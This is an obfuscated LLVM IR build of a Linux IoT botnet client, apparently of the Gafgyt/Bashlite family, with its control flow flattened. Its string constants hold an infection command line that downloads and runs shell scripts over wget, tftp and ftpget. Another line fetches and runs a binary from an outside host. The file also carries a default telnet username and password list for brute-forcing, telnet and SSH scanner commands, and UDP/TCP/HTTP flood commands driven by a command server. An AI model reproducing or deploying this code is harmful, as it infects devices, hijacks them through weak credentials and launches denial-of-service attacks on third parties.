; ModuleID = 'host/ir_fla/B1nary.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.udphdr = type { %union.anon.3 }
%union.anon.3 = type { %struct.anon.4 }
%struct.anon.4 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@infectline = global i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), align 8
@.str = private unnamed_addr constant [375 x i8] c"cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://0.0.0.0/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 0.0.0.0 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 0.0.0.0; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\0D\0A\00", align 1
@commServer = global [1 x i8*] [i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i32 0, i32 0)], align 8
@.str.1 = private unnamed_addr constant [12 x i8] c"0.0.0.0:666\00", align 1
@useragents = global [23 x i8*] [i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([139 x i8], [139 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([137 x i8], [137 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.24, i32 0, i32 0)], align 16
@.str.2 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.3 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.4 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.5 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.6 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.7 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.8 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.9 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.10 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.11 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.12 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.13 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.14 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.15 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.16 = private unnamed_addr constant [139 x i8] c"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1\00", align 1
@.str.17 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.18 = private unnamed_addr constant [137 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.19 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.20 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.21 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.22 = private unnamed_addr constant [85 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6\00", align 1
@.str.23 = private unnamed_addr constant [128 x i8] c"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.24 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@usernames = global [4 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.28, i32 0, i32 0)], align 16
@.str.25 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.26 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@.str.27 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.28 = private unnamed_addr constant [6 x i8] c"ubnt\00\00", align 1
@passwords = global [13 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i32 0, i32 0)], align 16
@.str.29 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.30 = private unnamed_addr constant [7 x i8] c"vizxv\00\00", align 1
@.str.31 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.32 = private unnamed_addr constant [5 x i8] c"123\00\00", align 1
@.str.33 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.34 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.35 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.36 = private unnamed_addr constant [14 x i8] c"7ujMko0vizxv\00\00", align 1
@.str.37 = private unnamed_addr constant [10 x i8] c"dreambox\00\00", align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.127 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.38 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.39 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.40 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.41 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.42 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.43 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.44 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.45 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@ipState = internal global [5 x i8] zeroinitializer, align 1
@.str.46 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.47 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@.str.48 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.49 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@.str.50 = private unnamed_addr constant [8 x i8] c"0.0.0.0\00", align 1
@.str.51 = private unnamed_addr constant [14 x i8] c"GET gtop.sh\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [2 x i8] c"x\00", align 1
@.str.53 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.54 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.55 = private unnamed_addr constant [97 x i8] c"wget -q http://autoinstaller.us/NsfjSh -O .l; chmod +x .l; nohup ./.l </dev/null >/dev/null 2>&1\00", align 1
@.str.56 = private unnamed_addr constant [6 x i8] c"ogin:\00", align 1
@.str.57 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.58 = private unnamed_addr constant [6 x i8] c"user:\00", align 1
@.str.59 = private unnamed_addr constant [5 x i8] c"name\00", align 1
@.str.60 = private unnamed_addr constant [5 x i8] c"pass\00", align 1
@.str.61 = private unnamed_addr constant [5 x i8] c"word\00", align 1
@.str.62 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.63 = private unnamed_addr constant [8 x i8] c"invalid\00", align 1
@.str.64 = private unnamed_addr constant [10 x i8] c"incorrect\00", align 1
@.str.65 = private unnamed_addr constant [5 x i8] c"fail\00", align 1
@.str.66 = private unnamed_addr constant [6 x i8] c"again\00", align 1
@.str.67 = private unnamed_addr constant [6 x i8] c"wrong\00", align 1
@.str.68 = private unnamed_addr constant [13 x i8] c"accessdenied\00", align 1
@.str.69 = private unnamed_addr constant [7 x i8] c"denied\00", align 1
@.str.70 = private unnamed_addr constant [6 x i8] c"error\00", align 1
@.str.71 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@.str.72 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.73 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.74 = private unnamed_addr constant [16 x i8] c"REPORT %s:%s:%s\00", align 1
@.str.75 = private unnamed_addr constant [62 x i8] c"sh x;busybox chmod +x z | | chmod +x z;./z;rm -rf z;rm -f x\0D\0A\00", align 1
@.str.76 = private unnamed_addr constant [32 x i8] c"/bin/busybox;echo -e 'gayfgt'\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [10 x i8] c"ulti-call\00", align 1
@.str.78 = private unnamed_addr constant [11 x i8] c"multi-call\00", align 1
@.str.79 = private unnamed_addr constant [7 x i8] c"gayfgt\00", align 1
@.str.80 = private unnamed_addr constant [10 x i8] c"/bin/sh\0D\0A\00", align 1
@.str.81 = private unnamed_addr constant [4 x i8] c"dts\00", align 1
@.str.82 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.83 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.84 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.85 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.86 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.87 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.88 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.89 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.90 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.91 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.92 = private unnamed_addr constant [13 x i8] c"wget -s -U \22\00", align 1
@.str.93 = private unnamed_addr constant [6 x i8] c"\22 -q \00", align 1
@.str.94 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.95 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.96 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.97 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.98 = private unnamed_addr constant [39 x i8] c"SCANNER SSH/TELNET ON | SSH/TELNET OFF\00", align 1
@.str.99 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.100 = private unnamed_addr constant [24 x i8] c"TELNET SCANNER STOPPED\0A\00", align 1
@.str.101 = private unnamed_addr constant [10 x i8] c"TELNET ON\00", align 1
@.str.102 = private unnamed_addr constant [25 x i8] c"TELNET SCANNER EXECUTED\0A\00", align 1
@.str.103 = private unnamed_addr constant [7 x i8] c"SSH ON\00", align 1
@.str.104 = private unnamed_addr constant [22 x i8] c"SSH SCANNER EXECUTED\0A\00", align 1
@.str.105 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.106 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.107 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.108 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.109 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.110 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.111 = private unnamed_addr constant [10 x i8] c"LOLNOGTFO\00", align 1
@.str.112 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.113 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.114 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.115 = private unnamed_addr constant [7 x i8] c"DARKAI\00", align 1
@.str.116 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.117 = private unnamed_addr constant [10 x i8] c"BUILD %s\0A\00", align 1
@.str.118 = private unnamed_addr constant [13 x i8] c"fork failed\0A\00", align 1
@.str.119 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.120 = private unnamed_addr constant [9 x i8] c"BUILD %s\00", align 1
@.str.121 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.122 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.123 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.124 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.125 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.126 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  %switchVar = alloca i32
  store i32 509720376, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 509720376, label %10
    i32 1455364578, label %14
    i32 -2078483769, label %32
    i32 -2070591780, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  %13 = select i1 %12, i32 1455364578, i32 -2070591780
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i32, i32* %3, align 4
  %16 = sub nsw i32 %15, 3
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %17
  %19 = load i32, i32* %18, align 4
  %20 = load i32, i32* %3, align 4
  %21 = sub nsw i32 %20, 2
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %22
  %24 = load i32, i32* %23, align 4
  %25 = xor i32 %19, %24
  %26 = xor i32 %25, -1640531527
  %27 = load i32, i32* %3, align 4
  %28 = xor i32 %26, %27
  %29 = load i32, i32* %3, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %30
  store i32 %28, i32* %31, align 4
  store i32 -2078483769, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %3, align 4
  %34 = add nsw i32 %33, 1
  store i32 %34, i32* %3, align 4
  store i32 509720376, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %32, %14, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %.reg2mem2 = alloca i32
  %.reg2mem = alloca i32
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  store i32 %26, i32* %.reg2mem
  %27 = load i32, i32* @c, align 4
  store i32 %27, i32* %.reg2mem2
  %switchVar = alloca i32
  store i32 -540431997, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -540431997, label %first
    i32 -206247248, label %30
    i32 972975958, label %35
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %.reload3 = load volatile i32, i32* %.reg2mem2
  %28 = icmp ult i32 %.reload, %.reload3
  %29 = select i1 %28, i32 -206247248, i32 972975958
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32, i32* %3, align 4
  %32 = add i32 %31, 1
  store i32 %32, i32* %3, align 4
  %33 = load i32, i32* @c, align 4
  %34 = add i32 %33, 1
  store i32 %34, i32* @c, align 4
  store i32 972975958, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %4, align 4
  %37 = load i32, i32* %3, align 4
  %38 = sub i32 %36, %37
  %39 = load i32, i32* @rand_cmwc.i, align 4
  %40 = zext i32 %39 to i64
  %41 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %40
  store i32 %38, i32* %41, align 4
  ret i32 %38

loopEnd:                                          ; preds = %30, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  %switchVar = alloca i32
  store i32 32205404, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 32205404, label %10
    i32 129603723, label %20
    i32 1747996466, label %23
    i32 -1786018954, label %24
    i32 1922248305, label %29
    i32 478136314, label %38
    i32 111990564, label %40
    i32 982147066, label %43
    i32 639490624, label %45
    i32 -220381670, label %50
    i32 814012812, label %62
    i32 523678282, label %65
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #10
  %18 = icmp ne i32 %17, 0
  %19 = select i1 %18, i32 129603723, i32 1747996466
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %4, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %4, align 4
  store i32 32205404, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  store i32 -1786018954, i32* %switchVar
  br label %loopEnd

